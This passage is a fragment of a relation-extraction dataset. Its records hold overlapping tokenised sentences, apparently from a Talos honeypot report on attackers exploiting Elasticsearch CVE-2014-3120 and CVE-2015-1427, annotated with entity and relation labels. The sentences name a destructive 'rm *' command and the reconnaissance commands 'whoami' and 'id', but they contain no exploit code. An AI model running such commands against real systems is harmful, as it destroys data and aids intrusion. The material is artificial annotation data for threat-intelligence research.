2, "global_pos": [30, 30], "name": "executable", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [41, 41], "name": "exploits", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [47, 47], "name": "HTTPS", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [63, 63], "name": "attacker", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [70, 70], "name": "remote code", "pos": [16, 18], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [80, 80], "name": "second actor", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [83, 83], "name": "CVE-2014-3120", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [90, 90], "name": "payload", "pos": [13, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "Bill Gates", "pos": [19, 21], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [103, 103], "name": "third actor", "pos": [1, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "LinuxT", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [116, 116], "name": "HTTP", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [122, 122], "name": "CVE-2014-3120", "pos": [20, 21], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [125, 125], "name": "LinuxT", "pos": [1, 2], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [137, 137], "name": "C2", "pos": [13, 14], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "ST", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "t": 4, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "CO", "evidence": [5], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "ST", "evidence": [6], "h": 13, "t": 15}, {"r": "RF", "evidence": [6], "h": 13, "t": 15}, {"r": "EX", "evidence": [6], "h": 13, "t": 16}, {"r": "ST", "evidence": [6, 7], "h": 13, "t": 18}, {"r": "RF", "evidence": [6, 7], "h": 13, "t": 18}, {"r": "CO", "evidence": [6, 7], "t": 14, "h": 17}]}, {"title": "655-6", "sents": [["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "bash", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "ELF executable", "pos": [7, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "executable", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "exploits", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [35, 35], "name": "HTTPS", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "attacker", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "remote code", "pos": [16, 18], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [68, 68], "name": "second actor", "pos": [3, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [71, 71], "name": "CVE-2014-3120", "pos": [6, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "payload", "pos": [13, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "Bill Gates", "pos": [19, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "third actor", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [100, 100], "name": "LinuxT", "pos": [10, 11], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [104, 104], "name": "HTTP", "pos": [14, 15], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [110, 110], "name": "CVE-2014-3120", "pos": [20, 21], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [113, 113], "name": "LinuxT", "pos": [1, 2], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [125, 125], "name": "C2", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [159, 159], "name": "hosts", "pos": [14, 15], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [171, 171], "name": "payloads", "pos": [26, 27], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [177, 177], "name": "echo 'qq952135763", "pos": [32, 34], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 9}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "ST", "evidence": [5], "h": 11, "t": 13}, {"r": "RF", "evidence": [5], "h": 11, "t": 13}, {"r": "EX", "evidence": [5], "h": 11, "t": 14}, {"r": "ST", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "CO", "evidence": [5, 6, 7], "h": 11, "t": 17}, {"r": "CO", "evidence": [5, 6], "t": 12, "h": 15}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}, {"r": "CO", "evidence": [7], "h": 18, "t": 19}]}, {"title": "655-7", "sents": [["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "executable", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "exploits", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [25, 25], "name": "HTTPS", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "attacker", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "remote code", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "second actor", "pos": [3, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "CVE-2014-3120", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "payload", "pos": [13, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "Bill Gates", "pos": [19, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [81, 81], "name": "third actor", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "LinuxT", "pos": [10, 11], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [94, 94], "name": "HTTP", "pos": [14, 15], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "CVE-2014-3120", "pos": [20, 21], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [103, 103], "name": "LinuxT", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "C2", "pos": [13, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "hosts", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [161, 161], "name": "payloads", "pos": [26, 27], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "echo 'qq952135763", "pos": [32, 34], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "hosts", "pos": [5, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [182, 182], "name": "payloads", "pos": [10, 11], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "echo 'qq952135763", "pos": [15, 17], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [193, 193], "name": "echo '952135763", "pos": [21, 23], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "CO", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 11}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "EX", "evidence": [4], "h": 9, "t": 12}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 14}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 14}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 15}, {"r": "CO", "evidence": [4, 5], "t": 10, "h": 13}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "CO", "evidence": [6], "h": 16, "t": 17}, {"r": "WR", "evidence": [5, 6, 7], "t": 13, "h": 18}, {"r": "ST", "evidence": [5, 6, 7], "t": 14, "h": 18}, {"r": "RF", "evidence": [5, 6, 7], "t": 14, "h": 18}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}, {"r": "EX", "evidence": [7], "h": 18, "t": 20}, {"r": "EX", "evidence": [7], "h": 18, "t": 21}]}, {"title": "655-8", "sents": [["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."], ["Additionally", ",", "unlike", "other", "activity", "associated", "with", "this", "attacker", ",", "these", "attacks", "leveraged", "the", "newer", "Elasticsearch", "vulnerability", "rather", "than", "the", "older", "one", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "exploits", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "HTTPS", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "attacker", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "remote code", "pos": [16, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "second actor", "pos": [3, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "CVE-2014-3120", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "payload", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "Bill Gates", "pos": [19, 21], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "third actor", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "LinuxT", "pos": [10, 11], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [76, 76], "name": "HTTP", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "CVE-2014-3120", "pos": [20, 21], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "LinuxT", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [97, 97], "name": "C2", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [131, 131], "name": "hosts", "pos": [14, 15], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "payloads", "pos": [26, 27], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "echo 'qq952135763", "pos": [32, 34], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "hosts", "pos": [5, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "payloads", "pos": [10, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [169, 169], "name": "echo 'qq952135763", "pos": [15, 17], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "echo '952135763", "pos": [21, 23], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [200, 200], "name": "attacker", "pos": [8, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "Elasticsearch vulnerability", "pos": [15, 17], "index": "22_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "EX", "evidence": [3], "h": 8, "t": 11}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 13}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 13}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 14}, {"r": "CO", "evidence": [3, 4], "t": 9, "h": 12}, {"r": "WR", "evidence": [5], "h": 14, "t": 15}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [4, 5, 6], "t": 12, "h": 17}, {"r": "ST", "evidence": [4, 5, 6], "t": 13, "h": 17}, {"r": "RF", "evidence": [4, 5, 6], "t": 13, "h": 17}, {"r": "WR", "evidence": [6], "h": 17, "t": 18}, {"r": "EX", "evidence": [6], "h": 17, "t": 19}, {"r": "EX", "evidence": [6], "h": 17, "t": 20}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}]}, {"title": "655-9", "sents": [["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."], ["Additionally", ",", "unlike", "other", "activity", "associated", "with", "this", "attacker", ",", "these", "attacks", "leveraged", "the", "newer", "Elasticsearch", "vulnerability", "rather", "than", "the", "older", "one", "."], ["One", "actor", "issued", "an", "``", "rm", "*", "''", "command", ",", "while", "the", "other", "two", "actors", "were", "fingerprinting", "vulnerable", "servers", "by", "issuing", "'whoami", "'", "and", "'id", "'", "commands", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "attacker", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "remote code", "pos": [16, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "second actor", "pos": [3, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "CVE-2014-3120", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "payload", "pos": [13, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "Bill Gates", "pos": [19, 21], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "third actor", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "LinuxT", "pos": [10, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [62, 62], "name": "HTTP", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "CVE-2014-3120", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "LinuxT", "pos": [1, 2], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [83, 83], "name": "C2", "pos": [13, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "hosts", "pos": [14, 15], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "payloads", "pos": [26, 27], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "echo 'qq952135763", "pos": [32, 34], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "hosts", "pos": [5, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "payloads", "pos": [10, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [155, 155], "name": "echo 'qq952135763", "pos": [15, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [161, 161], "name": "echo '952135763", "pos": [21, 23], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [186, 186], "name": "attacker", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "Elasticsearch vulnerability", "pos": [15, 17], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "actor", "pos": [1, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [206, 206], "name": "rm", "pos": [5, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [213, 213], "name": "other two actors", "pos": [12, 15], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [222, 222], "name": "'whoami", "pos": [21, 22], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [225, 225], "name": "'id", "pos": [24, 25], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "EX", "evidence": [2], "h": 6, "t": 9}, {"r": "ST", "evidence": [2, 3], "h": 6, "t": 11}, {"r": "RF", "evidence": [2, 3], "h": 6, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 12}, {"r": "CO", "evidence": [2, 3], "t": 7, "h": 10}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [3, 4, 5], "t": 10, "h": 15}, {"r": "ST", "evidence": [3, 4, 5], "t": 11, "h": 15}, {"r": "RF", "evidence": [3, 4, 5], "t": 11, "h": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "EX", "evidence": [5], "h": 15, "t": 17}, {"r": "EX", "evidence": [5], "h": 15, "t": 18}, {"r": "RD", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "EX", "evidence": [7], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 23, "t": 24}, {"r": "EX", "evidence": [7], "h": 23, "t": 25}]}, {"title": "655-10", "sents": [["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."], ["As", "part", "of", "our", "research", ",", "we", "observed", "that", ",", "in", "some", "cases", ",", "hosts", "that", "attempted", "to", "download", "the", "``", "LinuxT", "''", "sample", "also", "dropped", "payloads", "that", "executed", "the", "command", "``", "echo", "'qq952135763", ".", "'", "''"], ["Our", "honeypots", "also", "detected", "additional", "hosts", "exploiting", "Elasticsearch", "to", "drop", "payloads", "that", "execute", "both", "``", "echo", "'qq952135763", "'", "''", "and", "``", "echo", "'952135763", ",", "'", "''", "suggesting", "that", "the", "attacks", "are", "related", "to", "the", "same", "QQ", "account", "."], ["Additionally", ",", "unlike", "other", "activity", "associated", "with", "this", "attacker", ",", "these", "attacks", "leveraged", "the", "newer", "Elasticsearch", "vulnerability", "rather", "than", "the", "older", "one", "."], ["One", "actor", "issued", "an", "``", "rm", "*", "''", "command", ",", "while", "the", "other", "two", "actors", "were", "fingerprinting", "vulnerable", "servers", "by", "issuing", "'whoami", "'", "and", "'id", "'", "commands", "."], ["CONCLUSIONTalos", "has", "observed", "multiple", "attackers", "exploiting", "CVE-2014-3120", "and", "CVE-2015-1427", "in", "our", "Elasticsearch", "honeypots", "to", "drop", "a", "variety", "of", "malicious", "payloads", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "second actor", "pos": [3, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "CVE-2014-3120", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "payload", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "Bill Gates", "pos": [19, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "third actor", "pos": [1, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "LinuxT", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [39, 39], "name": "HTTP", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "CVE-2014-3120", "pos": [20, 21], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "LinuxT", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "C2", "pos": [13, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "hosts", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [106, 106], "name": "payloads", "pos": [26, 27], "index": "11_0"}], [{"type": 